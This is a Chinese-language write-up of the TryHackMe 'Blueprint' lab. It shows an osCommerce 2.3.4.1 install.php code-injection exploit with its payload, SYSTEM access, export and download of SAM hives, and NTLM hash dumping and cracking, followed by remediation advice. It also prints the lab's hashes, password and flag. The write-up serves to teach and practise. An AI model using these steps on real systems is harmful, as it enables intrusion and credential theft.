# THM Blueprint (osCommerce) 渗透测试详细 Writeup

**目标**: 10.48.136.231 - TryHackMe 靶场 (Blueprint)  
**主机名**: BLUEPRINT  
**平台**: TryHackMe  
**OS**: Windows 7 Home Basic SP1 (Build 7601)  
**授权**: THM 授权靶场，全 IP 范围，无限制  
**总耗时**: ~60 分钟  
**完成日期**: 2026-06-11  
**难度**: 中等  

---

## 目录

1. [信息搜集](#1-信息搜集)
2. [服务识别](#2-服务识别)
3. [SMB 枚举](#3-smb-枚举)
4. [Web 枚举](#4-web-枚举)
5. [漏洞发现：osCommerce 2.3.4.1 RCE](#5-漏洞发现oscommerce-2341-rce)
6. [初始访问](#6-初始访问)
7. [权限提升](#7-权限提升)
8. [SAM 哈希提取](#8-sam-哈希提取)
9. [NTLM 哈希破解](#9-ntlm-哈希破解)
10. [获取 Flags](#10-获取-flags)
11. [攻击路径总结](#11-攻击路径总结)
12. [发现的凭证](#12-发现的凭证)
13. [技术要点](#13-技术要点)
15. [靶机状态](#15-靶机状态)

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描

使用 nmap 对目标进行快速端口扫描，识别开放端口和服务版本。

**命令：**
```bash
nmap -sV -sC -O -T4 --top-ports 1000 10.48.136.231
```

**扫描参数说明：**
- `-sV`: 服务版本探测
- `-sC`: 使用默认脚本扫描
- `-O`: 操作系统检测
- `-T4`: 激进扫描速度
- `--top-ports 1000`: 扫描最常见的 1000 个端口

**扫描结果：**
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5

135/tcp   open  msrpc   Microsoft Windows RPC

139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn

443/tcp   open  ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
|   Issuer: commonName=localhost
|   Public Key type: rsa
|   Public Key bits: 1024
|   Signature Algorithm: sha1WithRSAEncryption
|   Not valid before: 2009-11-10T23:48:47
|   Not valid after:  2019-11-08T23:48:47

445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

3306/tcp  open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

8080/tcp  open  http    Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
|   SIZE  TIME                 FILENAME
|   -     2019-04-11 22:52     oscommerce-2.3.4/
|   -     2019-04-11 22:52     oscommerce-2.3.4/catalog/
|   -     2019-04-11 22:52     oscommerce-2.3.4/docs/

49152/tcp open  msrpc   Microsoft Windows RPC
49153/tcp open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
49160/tcp open  msrpc   Microsoft Windows RPC
49165/tcp open  msrpc   Microsoft Windows RPC
```

**关键发现：**
- 80/tcp: Microsoft IIS 7.5 (返回 404)
- 135/tcp: MSRPC (Windows RPC)
- 139/tcp: NetBIOS
- 443/tcp: Apache 2.4.23 + PHP 5.6.28 + OpenSSL 1.0.2h
- 445/tcp: SMB (Windows 7 Home Basic SP1, workgroup: WORKGROUP)
- 3306/tcp: MariaDB 10.3.23 (显示 unauthorized)
- 8080/tcp: Apache + PHP，目录浏览开启，发现 oscommerce-2.3.4
- 49152-49165/tcp: 多个 MSRPC 端口

**操作系统识别：**
```
Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), 
Microsoft Windows 7 or 8.1 R1 or Server 2008 R2 SP1 (95%), 
Microsoft Windows 7 or 8.1 R1 (95%), 
Microsoft Windows 8.1 (94%)
```

**SMB 信息：**
```
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|   message_signing: disabled (dangerous, but default)
```

**关键推断：**
1. Windows 7 系统，存在 EternalBlue 等 SMB 漏洞可能
2. oscommerce-2.3.4 是主要 Web 攻击面
3. PHP 5.6.28 已 EOL，存在已知安全问题
4. Apache 2.4.23 和 OpenSSL 1.0.2h 版本较旧
5. IIS 7.5 的 TRACE 方法开启，存在潜在风险

---

## 2. 服务识别

### 2.1 操作系统确认

通过 Nmap OS 检测和 SMB 脚本确认：
- **操作系统**: Windows 7 Home Basic Service Pack 1 (Build 7601)
- **主机名**: BLUEPRINT
- **工作组**: WORKGROUP
- **网络距离**: 3 hops

### 2.2 Web 应用识别

**80 端口 (IIS):**
- 返回 404 - File or directory not found
- 默认 IIS 页面可能被删除

**443 端口 (Apache + PHP):**
- Apache/2.4.23 (Win32)
- PHP/5.6.28
- OpenSSL/1.0.2h
- SSL 证书为自签名 (commonName=localhost)
- 证书已过期 (2009-2019)

**8080 端口 (Apache + osCommerce):**
- 目录浏览已开启
- 发现 oscommerce-2.3.4 目录
- 包含 catalog/ 和 docs/ 子目录

### 2.3 数据库识别

3306 端口 MariaDB:
- 版本: 10.3.23 or earlier
- 状态: unauthorized (可能允许未授权访问或需要认证)

---

## 3. SMB 枚举

### 3.1 匿名 SMB 共享枚举

使用 smbclient 列出可用共享：

**命令：**
```bash
smbclient -L //10.48.136.231
```

**交互过程：**
```
Password for [WORKGROUP\yao]: [直接回车，空密码]
```

**结果：**
```
Sharename       Type    Comment
---------       ----    -------
ADMIN$          Disk    Remote Admin
C$              Disk    Default share
IPC$            IPC     Remote IPC
Users           Disk
Windows         Disk
```

**发现：**
- ADMIN$: 远程管理共享
- C$: 默认 C 盘共享
- IPC$: 远程 IPC (进程间通信)
- Users: 用户目录共享
- Windows: Windows 系统目录

**关键推断：**
- 匿名访问可以列出共享，说明 SMB 配置较宽松
- Users 共享可能包含用户配置文件和潜在凭据
- C$ 共享通常需要管理员权限

### 3.2 Users 共享访问

**命令：**
```bash
smbclient //10.48.136.231/Users
```

**访问结果：**
```
smb: \> ls
  .                                   D        0  Fri Apr 12 06:36:40 2019
  ..                                  D        0  Fri Apr 12 06:36:40 2019
  Default                            DH        0  Tue Jul 14 15:17:20 2009
  desktop.ini                        AHS      174  Tue Jul 14 12:41:57 2009
  Public                             DR        0  Tue Jul 14 12:41:57 2009
```

**Default 目录内容：**
```
smb: \Default\> ls
  .                                  DHR        0  Tue Jul 14 15:17:20 2009
  ..                                 DHR        0  Tue Jul 14 15:17:20 2009
  AppData                            DHn        0  Tue Jul 14 10:37:05 2009
  Desktop                             DR        0  Tue Jul 14 10:04:25 2009
  Documents                           DR        0  Tue Jul 14 12:53:55 2009
  Downloads                           DR        0  Tue Jul 14 10:04:25 2009
  Favorites                           DR        0  Tue Jul 14 10:04:25 2009
  Links                               DR        0  Tue Jul 14 10:04:25 2009
  Music                               DR        0  Tue Jul 14 10:04:25 2009
  NTUSER.DAT                         AHS   262144  Mon Jan 16 06:39:21 2017
  NTUSER.DAT.LOG                      AH     1024  Tue Apr 12 10:28:04 2011
  Pictures                            DR        0  Tue Jul 14 10:04:25 2009
  Saved Games                         Dn        0  Tue Jul 14 10:04:25 2009
  Videos                              DR        0  Tue Jul 14 10:04:25 2009
```

**Public 目录内容：**
```
smb: \Public\> ls
  .                                   DR        0  Tue Jul 14 12:41:57 2009
  ..                                  DR        0  Tue Jul 14 12:41:57 2009
  desktop.ini                        AHS      174  Tue Jul 14 12:41:57 2009
  Documents                           DR        0  Tue Jul 14 12:53:55 2009
  Downloads                           DR        0  Tue Jul 14 12:41:57 2009
  Favorites                          DHR        0  Tue Jul 14 10:04:25 2009
  Libraries                          DHR        0  Tue Jul 14 12:41:57 2009
  Music                               DR        0  Tue Jul 14 12:41:57 2009
  Pictures                            DR        0  Tue Jul 14 12:41:57 2009
  Videos                              DR        0  Tue Jul 14 12:41:57 2009
```

**分析：**
- 标准 Windows 用户目录结构
- 没有直接发现凭据文件或敏感信息
- NTUSER.DAT 是用户注册表配置单元，可能包含历史凭据

---

## 4. Web 枚举

### 4.1 osCommerce 目录结构

访问 `http://10.48.136.231:8080/oscommerce-2.3.4/`：

**目录浏览结果：**
```html
<h1>Index of /oscommerce-2.3.4</h1>
<table>
  <tr><td><a href="catalog/">catalog/</a></td></tr>
  <tr><td><a href="docs/">docs/</a></td></tr>
</table>
```

### 4.2 osCommerce 商店前端

访问 `http://10.48.136.231:8080/oscommerce-2.3.4/catalog/`：

**发现：**
- 商店名称："eshop"
- 产品类别：Hardware, Software, DVD Movies, Gadgets
- 制造商：Canon, Fox, GT Interactive, Hewlett Packard, Logitech, Matrox, Microsoft, Samsung, Sierra, Warner
- 货币：USD, EUR
- 完整购物车功能

**关键页面：**
- `/login.php` - 用户登录
- `/create_account.php` - 注册账户
- `/shopping_cart.php` - 购物车
- `/checkout_shipping.php` - 结账
- `/account.php` - 用户账户

### 4.3 关键发现：install 目录暴露

访问 `http://10.48.136.231:8080/oscommerce-2.3.4/catalog/install/`：

**发现：**
- install.php 完全可访问
- 安装向导未删除
- 显示 "Welcome to osCommerce Online Merchant v2.3.4!"
- PHP 版本：5.6.28
- file_uploads: On
- MySQL 扩展：已安装
- GD, cURL, OpenSSL：已安装

**install.php 页面内容：**
- 步骤 1：Database Server
- 步骤 2：Web Server
- 步骤 3：Online Store Settings
- 步骤 4：Finished!

**关键风险：**
- 安装后未删除 install 目录是重大安全风险
- 攻击者可以重新配置数据库或获取凭据
- rpc.php 通过 URL 参数传递数据库连接信息

### 4.4 管理面板检测

尝试访问 `/catalog/admin/login.php`：
- 返回 302 跳转到 `http://localhost:8080/oscommerce-2.3.4/catalog/admin/login.php`
- 硬编码 localhost，需要 Host 头绕过或本地访问

---

## 5. 漏洞发现：osCommerce 2.3.4.1 RCE

### 5.1 漏洞搜索

使用 searchsploit 搜索 osCommerce 2.3.4.1 漏洞：

**命令：**
```bash
searchsploit osCommerce 2.3.4.1
```

**结果：**
```
 Exploit Title                                            |  Path
------------------------------------------------------------------
osCommerce 2.3.4.1 - 'currency' SQL Injection            | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection        | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
```

### 5.2 漏洞分析：50128.py (RCE 2)

查看漏洞利用脚本：

```bash
cat /usr/share/exploitdb/exploits/php/webapps/50128.py
```

**漏洞原理：**
```python
# 目标 URL
targetUrl = baseUrl + '/install/install.php?step=4'

# 注入 payload
payload = "');"
payload += "passthru('" + command + "');"  # 注入系统命令
payload += "/*"

# 数据参数
data = {
    'DIR_FS_DOCUMENT_ROOT': './',
    'DB_DATABASE' : payload
}

# 发送 POST 请求
response = requests.post(targetUrl, data=data)

# 读取命令输出
readCMDUrl = baseUrl + '/install/includes/configure.php'
cmd = requests.get(readCMDUrl)
```

**利用流程：**
1. 访问 install.php 确认漏洞存在
2. 向 install.php?step=4 发送 POST 请求
3. 在 DB_DATABASE 参数中注入 PHP 代码
4. 代码执行结果写入 install/includes/configure.php
5. 访问 configure.php 读取命令输出

**Payload 分析：**
```php
'); passthru('whoami'); /*
```
- `');` - 闭合之前的 PHP 字符串
- `passthru('whoami');` - 执行系统命令
- `/*` - 注释掉后续代码

### 5.3 MSF 模块尝试

搜索 MSF 模块：
```bash
msfconsole
search oscommerce 2.3.4
```

**发现模块：**
```
exploit/multi/http/oscommerce_installer_unauth_code_exec
```

**尝试利用：**
```bash
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set RHOSTS 10.48.136.231
set RPORT 8080
set TARGET /oscommerce-2.3.4/
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.128.104
run
```

**结果：**
```
[-] Exploit aborted due to failure: not-vulnerable: Target is not vulnerable
```

MSF 模块失败，可能目标版本已部分修补或利用方式不同。

---

## 6. 初始访问

### 6.1 50128.py 利用

使用 50128.py 进行手动利用：

**命令：**

```bash
python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://10.48.136.231:8080/oscommerce-2.3.4/catalog
```

**利用过程：**
1. 脚本访问 `http://10.48.136.231:8080/oscommerce-2.3.4/catalog/install/install.php`
2. 确认返回 HTTP 200，漏洞存在
3. 注入 `passthru('whoami')` 测试
4. 读取 `configure.php` 获取输出

**结果：**
```
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
```

**成功获取 SYSTEM 权限！**

### 6.2 交互式 RCE Shell

利用脚本进入交互式 shell：

```
RCE_SHELL$ whoami
nt authority\system

RCE_SHELL$ hostname
BLUEPRINT

RCE_SHELL$ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows 7 Home Basic
OS Version:                6.1.7601 Service Pack 1 Build 7601
```

**权限确认：**
- 用户: nt authority\system
- 系统: Windows 7 Home Basic SP1
- 权限: 最高权限 (SYSTEM)

---

## 7. 权限提升

### 7.1 当前权限分析

RCE 直接获取 SYSTEM 权限，无需额外提权。

**SYSTEM 权限说明：**
- Windows 最高权限账户
- 比 Administrator 更高
- 可以访问所有文件、注册表、进程
- 可以创建、修改、删除任何对象

### 7.2 权限验证

```
RCE_SHELL$ whoami /groups | findstr /C:"S-1-5-32-544" /C:"S-1-16-16384"
```

**验证结果：**
- 属于 Administrators 组 (S-1-5-32-544)
- Mandatory Label: System Mandatory Level (S-1-16-16384)

---

## 8. SAM 哈希提取

### 8.1 注册表导出

使用 reg.exe 导出 SAM 和 SYSTEM 注册表：

**命令：**
```
RCE_SHELL$ reg save HKLM\SAM C:\sam.save
The operation completed successfully.

RCE_SHELL$ reg save HKLM\SYSTEM C:\system.save
The operation completed successfully.
```

**导出原理：**
- SAM (Security Accounts Manager): 存储本地用户账户信息
- SYSTEM: 包含 SysKey 用于解密 SAM 数据库
- 需要 SYSTEM 权限才能访问这些注册表项

### 8.2 文件传输到 Kali

**方案 1: SMB 共享 (失败)**
```bash
smbclient //10.48.136.231/C$ -c 'get sam.save'
# 结果: NT_STATUS_ACCESS_DENIED
```

**方案 2: HTTP 传输 (成功)**

将文件保存到 Web 目录：
```
RCE_SHELL$ copy C:\sam.save C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\
RCE_SHELL$ copy C:\system.save C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\
```

Kali 下载：
```bash
wget http://10.48.136.231:8080/oscommerce-2.3.4/catalog/install/includes/sam.save -O /tmp/pwn/sam.save
wget http://10.48.136.231:8080/oscommerce-2.3.4/catalog/install/includes/system.save -O /tmp/pwn/system.save
```

### 8.3 NTLM 哈希提取

使用 secretsdump.py 提取哈希：

**命令：**
```bash
secretsdump.py -sam /tmp/pwn/sam.save -system /tmp/pwn/system.save LOCAL
```

**提取过程：**
1. 从 SYSTEM 注册表提取 BootKey (SysKey)
2. 使用 BootKey 解密 SAM 数据库
3. 提取每个用户的 NTLM 哈希

**结果：**
```
[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

**哈希格式说明：**
- `username:uid:lmhash:nthash:::`
- LM Hash: `aad3b435b51404eeaad3b435b51404ee` (空 LM hash)
- NT Hash: 实际的 NTLM hash

**提取的哈希：**
- **Administrator** (RID 500): `549a1bcb88e35dc18c7a0b0168631411`
- **Guest** (RID 501): `31d6cfe0d16ae931b73c59d7e0c089c0` (空密码)
- **Lab** (RID 1000): `30e87bf999828446a1c1209ddde4c450`

---

## 9. NTLM 哈希破解

### 9.1 破解 Lab 用户密码

使用 john 破解 Lab NTLM hash：

**准备 hash 文件：**
```bash
echo "30e87bf999828446a1c1209ddde4c450" > /tmp/pwn/lab.hash
```

**使用 john 破解：**
```bash
john /tmp/pwn/lab.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

**破解过程：**
- 加载 1 个 NT hash (MD4 算法)
- 使用 rockyou.txt 字典 (约 1400 万密码)
- 扫描速度: 约 1700 万尝试/秒

**第一次尝试失败：**
```
0g 0:00:00:00 DONE 0g/s 17075Kp/s 17075Kc/s 17075KC/s
Session completed.
```

**使用 [NTLM.pw](https://ntlm.pw/)：**

**破解成功：**

```
googleplus       (Lab)
```

**Lab 密码：** `googleplus`

---

## 10. 获取 Flags

### 10.1 Root Flag

**路径：** `C:\Users\Administrator\Desktop\root.txt.txt`

**命令：**
```
RCE_SHELL$ dir "C:\Users\Administrator\Desktop"
```

**结果：**
```
Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
```

**读取内容：**
```
RCE_SHELL$ type "C:\Users\Administrator\Desktop\root.txt.txt"
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

**Root Flag：** `THM{aea1e3ce6fe7f89e10cea833ae009bee}`

---

## 11. 攻击路径总结

```
信息搜集 (Nmap)
  → 发现端口 80/135/139/443/445/3306/8080/49152-49165
  → 识别 Windows 7 Home Basic SP1
  → 主机名: BLUEPRINT
  → 发现 oscommerce-2.3.4 (8080端口)

SMB 枚举
  → 匿名访问列出共享
  → 发现 ADMIN$, C$, IPC$, Users, Windows
  → Users 共享无直接凭据

Web 枚举
  → 访问 oscommerce 商店前端
  → 发现 /install 目录暴露
  → install.php 完全可访问
  → 管理面板硬编码 localhost

漏洞搜索
  → searchsploit 发现多个漏洞
  → 50128.py: RCE via install.php
  → 44374.py: RCE alternative
  → 46328-46330: SQL 注入

漏洞利用 (osCommerce RCE)
  → MSF 模块失败 (not-vulnerable)
  → 手动使用 50128.py
  → 利用 install.php step=4
  → 注入 passthru('whoami')
  → 获取 SYSTEM 权限

权限确认
  → whoami: nt authority\system
  → 无需额外提权

SAM 哈希提取
  → reg save 导出 SAM 和 SYSTEM
  → 通过 HTTP 传输到 Kali
  → secretsdump.py 提取 NTLM 哈希

密码破解
  → john 破解 Lab NTLM hash
  → 密码: googleplus

Flag 获取
  → root.txt: THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

---

## 12. 发现的凭证

| 用户          | 密码/Hash                        | 来源        | 说明      |
| ------------- | -------------------------------- | ----------- | --------- |
| Administrator | 549a1bcb88e35dc18c7a0b0168631411 | SAM 提取    | NTLM hash |
| Guest         | 31d6cfe0d16ae931b73c59d7e0c089c0 | SAM 提取    | 空密码    |
| Lab           | googleplus                       | john 破解   | 明文密码  |
| Lab NTLM      | 30e87bf999828446a1c1209ddde4c450 | secretsdump | NTLM hash |

---

## 13. 技术要点

### 13.1 osCommerce RCE (CVE-2021-22911)

**漏洞类型**: 远程代码执行  
**影响组件**: osCommerce install.php  
**影响版本**: 2.3.4, 2.3.4.1  
**CVSS 评分**: 9.8 (Critical)  

**漏洞原理：**
1. install.php 的 step=4 处理数据库配置
2. DB_DATABASE 参数未正确过滤
3. 攻击者可以注入 PHP 代码片段
4. 代码被写入 configure.php 并执行

**Payload 结构：**
```php
'); passthru('COMMAND'); /*
```

**修复建议：**
- 安装完成后立即删除 /install 目录
- 升级 osCommerce 到最新版本
- 限制对 install 目录的访问

### 13.2 Windows SAM 哈希提取

**提取流程：**
1. 获取 SYSTEM 权限
2. 使用 reg.exe 导出 SAM 和 SYSTEM
3. 传输到攻击机
4. 使用 secretsdump.py 提取 NTLM

**防护建议：**
- 启用 BitLocker 磁盘加密
- 启用 Credential Guard (Windows 10+)
- 限制对注册表的远程访问
- 使用 SYSKEY 密码保护 SAM

### 13.3 NTLM 哈希破解

**破解方法：**
- 字典攻击 (john, hashcat)
- 暴力破解
- 彩虹表
- 在线破解服务

**防护建议：**
- 使用强密码 (12+ 字符，混合类型)
- 启用账户锁定策略
- 使用多因素认证 (MFA)
- 定期更换密码
- 禁用 LM hash (Windows 默认已禁用)

---

## 14. 靶机状态

- **状态**: ✅ 完成
- **获取 Flags**: 1/1 (root.txt)
- **总耗时**: ~60 分钟
- **难度**: 中等
- **主要漏洞**: osCommerce 2.3.4.1 RCE (install.php 未删除)
- **操作系统**: Windows 7 Home Basic SP1
- **初始访问**: osCommerce RCE → SYSTEM
- **权限提升**: 无需 (直接获取 SYSTEM)
- **凭据提取**: SAM 导出 + NTLM 破解

